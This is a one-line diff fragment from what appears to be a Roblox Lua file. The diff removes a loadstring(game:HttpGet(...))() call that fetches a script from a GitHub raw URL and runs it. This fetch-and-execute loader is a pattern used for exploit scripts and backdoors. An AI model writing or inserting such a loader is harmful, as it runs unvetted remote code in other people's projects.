@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/mykhajlo1357/qavqa/main/New%20Text%20Document.lua"))()
